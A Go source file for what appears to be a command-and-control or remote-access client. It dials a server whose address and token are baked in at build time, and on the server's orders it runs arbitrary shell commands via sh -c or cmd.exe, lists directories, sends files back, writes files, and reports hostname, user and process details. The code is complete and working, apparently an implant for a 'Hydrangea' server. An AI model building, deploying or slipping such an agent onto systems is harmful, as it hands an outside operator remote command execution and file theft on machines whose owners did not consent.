package main

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

/*
These variables are hard-coded at build time via -ldflags -X.
Strings only (Go linker limitation).
*/
var (
	DefaultServerHost = "127.0.0.1"
	DefaultServerPort = "9000"
	DefaultAuthToken  = "supersecret"
	DefaultClientID   = "" // if empty, will fallback to hostname
	DefaultRootBase = "." // base for *relative* paths; absolute paths always allowed
)

// ------------- framing (compat with Hydrangea) -------------

type Header = map[string]any

func readFrame(r io.Reader) (Header, []byte, error) {
	var n32 uint32
	if err := binary.Read(r, binary.BigEndian, &n32); err != nil {
		return nil, nil, err
	}
	if n32 > 10_000_000 {
		return nil, nil, fmt.Errorf("unreasonable header length: %d", n32)
	}
	hdrBytes := make([]byte, n32)
	if _, err := io.ReadFull(r, hdrBytes); err != nil {
		return nil, nil, err
	}
	var hdr Header
	if err := json.Unmarshal(hdrBytes, &hdr); err != nil {
		return nil, nil, fmt.Errorf("invalid JSON header: %w", err)
	}
	sz := int(getFloat(hdr, "size", 0))
	var payload []byte
	if sz > 0 {
		payload = make([]byte, sz)
		if _, err := io.ReadFull(r, payload); err != nil {
			return nil, nil, err
		}
	}
	return hdr, payload, nil
}

func writeFrame(w io.Writer, hdr Header, payload []byte) error {
	if payload == nil {
		payload = []byte{}
	}
	// copy & set size
	h := Header{}
	for k, v := range hdr {
		h[k] = v
	}
	h["size"] = len(payload)

	hdrBytes, err := json.Marshal(h)
	if err != nil {
		return err
	}
	if err := binary.Write(w, binary.BigEndian, uint32(len(hdrBytes))); err != nil {
		return err
	}
	if _, err := w.Write(hdrBytes); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := w.Write(payload); err != nil {
			return err
		}
	}
	if fl, ok := w.(interface{ Flush() error }); ok {
		return fl.Flush()
	}
	return nil
}

// ------------- utils -------------

func getString(m Header, k, def string) string {
	if v, ok := m[k]; ok {
		switch t := v.(type) {
		case string:
			return t
		}
	}
	return def
}

func getBool(m Header, k string, def bool) bool {
	if v, ok := m[k]; ok {
		switch t := v.(type) {
		case bool:
			return t
		}
	}
	return def
}

func getFloat(m Header, k string, def float64) float64 {
	if v, ok := m[k]; ok {
		switch t := v.(type) {
		case float64:
			return t
		case int:
			return float64(t)
		case json.Number:
			f, _ := t.Float64()
			return f
		}
	}
	return def
}

func sha256Hex(b []byte) string {
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

func safeUser() string {
	u, err := user.Current()
	if err == nil && u != nil && u.Username != "" {
		return u.Username
	}
	if v := os.Getenv("USER"); v != "" {
		return v
	}
	if v := os.Getenv("USERNAME"); v != "" {
		return v
	}
	return "unknown"
}

func resolveClientPath(rootBase, p string) (string, error) {
	if p == "" || p == "." {
		return filepath.Abs(rootBase)
	}
	if filepath.IsAbs(p) {
		return filepath.Abs(p)
	}
	return filepath.Abs(filepath.Join(rootBase, p))
}

func ensureDir(path string) error {
	dir := filepath.Dir(path)
	if dir == "" {
		return nil
	}
	return os.MkdirAll(dir, 0o755)
}

func nowSeconds(t time.Time) int64 {
	return t.Unix()
}

// ------------- command handling -------------

func handleListDir(conn net.Conn, root string, hdr Header) {
	path := getString(hdr, "path", ".")
	reqID := getString(hdr, "req_id", "")
	real, err := resolveClientPath(root, path)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed for %s: %v", path, err)}, nil)
		return
	}

	ents, err := os.ReadDir(real)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed for %s: %v", path, err)}, nil)
		return
	}

	type out struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Bytes int64  `json:"bytes"`
		Mtime int64  `json:"mtime"`
	}
	var rows []out
	for _, e := range ents {
		info, err := e.Info()
		if err != nil {
			continue
		}
		rows = append(rows, out{
			Name:  e.Name(),
			IsDir: e.IsDir(),
			Bytes: info.Size(),
			Mtime: nowSeconds(info.ModTime()),
		})
	}

	respHdr := Header{
		"type":          "RESULT_LIST_DIR",
		"path":          path,
		"entries_count": float64(len(rows)),
	}
	if reqID != "" {
		respHdr["req_id"] = reqID
	}
	payload, _ := json.Marshal(rows)
	_ = writeFrame(conn, respHdr, payload)
}

func handlePullFile(conn net.Conn, root string, hdr Header) {
	src := getString(hdr, "src_path", "")
	saveAs := getString(hdr, "save_as", filepath.Base(src))
	real, err := resolveClientPath(root, src)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed for %s: %v", src, err)}, nil)
		return
	}
	data, err := os.ReadFile(real)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed for %s: %v", src, err)}, nil)
		return
	}
	digest := sha256Hex(data)
	_ = writeFrame(conn, Header{
		"type":     "FILE",
		"src_path": src,
		"save_as":  saveAs,
		"sha256":   digest,
	}, data)
}

func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
	dest := getString(hdr, "dest_path", "")
	srcName := getString(hdr, "src_name", "server_upload.bin")
	real, err := resolveClientPath(root, dest)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
		return
	}
	if err := ensureDir(real); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
		return
	}
	if err := os.WriteFile(real, payload, 0o644); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
		return
	}
	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("Saved file to %s (%d bytes) from %s", dest, len(payload), srcName)}, nil)
}

func parseCmdField(v any) ([]string, error) {
	switch t := v.(type) {
	case string:
		// naive split (parity with Python client); prefer JSON array for complex cases
		ff := strings.Fields(t)
		if len(ff) == 0 {
			return nil, errors.New("empty command")
		}
		return ff, nil
	case []any:
		out := make([]string, 0, len(t))
		for _, e := range t {
			out = append(out, fmt.Sprint(e))
		}
		if len(out) == 0 {
			return nil, errors.New("empty command")
		}
		return out, nil
	default:
		return nil, errors.New("unsupported cmd type")
	}
}

func shellWrapper(args []string) []string {
	if len(args) == 1 {
		// Full command line; delegate to shell
		if runtime.GOOS == "windows" {
			return []string{"cmd.exe", "/C", args[0]}
		}
		return []string{"sh", "-c", args[0]}
	}
	// Already tokenized → exec directly
	return args
}

func handleExec(conn net.Conn, root string, hdr Header) {
	reqID := getString(hdr, "req_id", "")
	timeoutSec := time.Duration(getFloat(hdr, "timeout", 30)) * time.Second
	useShell := getBool(hdr, "shell", false)
	cwd := getString(hdr, "cwd", "")
	var argv []string
	var err error

	if useShell {
		// shell mode accepts string or list; if list -> join to single command line
		switch t := hdr["cmd"].(type) {
		case string:
			argv = shellWrapper([]string{t})
		default:
			// treat as list → join as single string
			rawList, _ := parseCmdField(hdr["cmd"])
			argv = shellWrapper([]string{strings.Join(rawList, " ")})
		}
	} else {
		argv, err = parseCmdField(hdr["cmd"])
		if err != nil {
			sendExecResult(conn, reqID, nil, []byte{}, []byte("invalid cmd: "+err.Error()))
			return
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeoutSec)
	defer cancel()

	var cmd *exec.Cmd
	if len(argv) == 0 {
		sendExecResult(conn, reqID, nil, []byte{}, []byte("empty argv"))
		return
	}
	if cwd != "" {
		resolved, _ := resolveClientPath(root, cwd)
		cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
		cmd.Dir = resolved
	} else {
		cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
	}

	// inherit minimal env; do not attach stdin
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendExecResult(conn, reqID, nil, []byte{}, []byte("stdout pipe: "+err.Error()))
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		sendExecResult(conn, reqID, nil, []byte{}, []byte("stderr pipe: "+err.Error()))
		return
	}

	if err := cmd.Start(); err != nil {
		sendExecResult(conn, reqID, nil, []byte{}, []byte("start: "+err.Error()))
		return
	}

	outB, _ := io.ReadAll(stdout)
	errB, _ := io.ReadAll(stderr)
	rc := 0
	waitErr := cmd.Wait()
	if waitErr != nil {
		// best-effort extract exit code
		if exitErr, ok := waitErr.(*exec.ExitError); ok {
			if status, ok := exitErr.Sys().(syscall.WaitStatus); ok {
				rc = status.ExitStatus()
			} else {
				rc = 1
			}
		} else if errors.Is(waitErr, context.DeadlineExceeded) {
			// already killed by context
			// rc left at 0? better mark unknown
			rc = -1
			errB = append(errB, []byte("\ntimeout")...)
		} else {
			rc = 1
		}
	}

	sendExecResult(conn, reqID, &rc, outB, errB)
}

func sendExecResult(conn net.Conn, reqID string, rc *int, out, errB []byte) {
	payloadMap := map[string]any{
		"rc":     nil,
		"stdout": string(out),
		"stderr": string(errB),
	}
	respHdr := Header{"type": "RESULT_EXEC", "rc": nil}
	if rc != nil {
		payloadMap["rc"] = *rc
		respHdr["rc"] = *rc
	}
	if reqID != "" {
		respHdr["req_id"] = reqID
	}
	payload, _ := json.Marshal(payloadMap)
	_ = writeFrame(conn, respHdr, payload)
}

func handleSessionInfo(conn net.Conn, root string, hdr Header) {
	reqID := getString(hdr, "req_id", "")
	cwd, _ := os.Getwd()
	host, _ := os.Hostname()
	info := map[string]any{
		"platform":   fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
		"system":     runtime.GOOS,
		"release":    "-", // not easily portable; left blank
		"version":    runtime.Version(),
		"machine":    runtime.GOARCH,
		"processor":  runtime.GOARCH,
		"python":     "-", // n/a for Go client
		"pid":        os.Getpid(),
		"user":       safeUser(),
		"cwd":        cwd,
		"hostname":   host,
		"root":       root,
		"executable": os.Args[0],
	}
	respHdr := Header{"type": "RESULT_SESSION_INFO"}
	if reqID != "" {
		respHdr["req_id"] = reqID
	}
	payload, _ := json.Marshal(info)
	_ = writeFrame(conn, respHdr, payload)
}

// ------------- main -------------

func main() {
	// Flags are optional overrides; defaults are compile-time injected.
	host := flag.String("server", DefaultServerHost, "server host/IP")
	portStr := flag.String("port", DefaultServerPort, "server port")
	token := flag.String("auth-token", DefaultAuthToken, "auth token")
	clientID := flag.String("client-id", DefaultClientID, "client ID (default: hostname)")
	rootBase := flag.String("root", DefaultRootBase, "base for relative paths")
	flag.Parse()

	if *clientID == "" {
		if h, _ := os.Hostname(); h != "" {
			*clientID = h
		} else {
			*clientID = "go-client"
		}
	}
	port, _ := strconv.Atoi(*portStr)

	addr := net.JoinHostPort(*host, strconv.Itoa(port))
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "connect error to %s: %v\n", addr, err)
		os.Exit(2)
	}
	defer conn.Close()

	// REGISTER
	_ = writeFrame(conn, Header{
		"type":      "REGISTER",
		"client_id": *clientID,
		"token":     *token,
	}, nil)

	// Expect REGISTERED
	hdr, _, err := readFrame(conn)
	if err != nil {
		fmt.Fprintf(os.Stderr, "register read error: %v\n", err)
		os.Exit(2)
	}
	if getString(hdr, "type", "") != "REGISTERED" {
		fmt.Fprintf(os.Stderr, "registration failed: %+v\n", hdr)
		os.Exit(2)
	}

	// Main loop
	for {
		h, payload, err := readFrame(conn)
		if err != nil {
			if !errors.Is(err, io.EOF) {
				fmt.Fprintf(os.Stderr, "read error: %v\n", err)
			}
			return
		}
		switch getString(h, "type", "") {
		case "PING":
			_ = writeFrame(conn, Header{"type": "PONG"}, nil)

		case "LIST_DIR":
			handleListDir(conn, *rootBase, h)

		case "PULL_FILE":
			handlePullFile(conn, *rootBase, h)

		case "PUSH_FILE":
			handlePushFile(conn, *rootBase, h, payload)

		case "EXEC":
			handleExec(conn, *rootBase, h)

		case "SESSION_INFO":
			handleSessionInfo(conn, *rootBase, h)

		default:
			_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("Unknown order type %v", h["type"])}, nil)
		}
	}
}
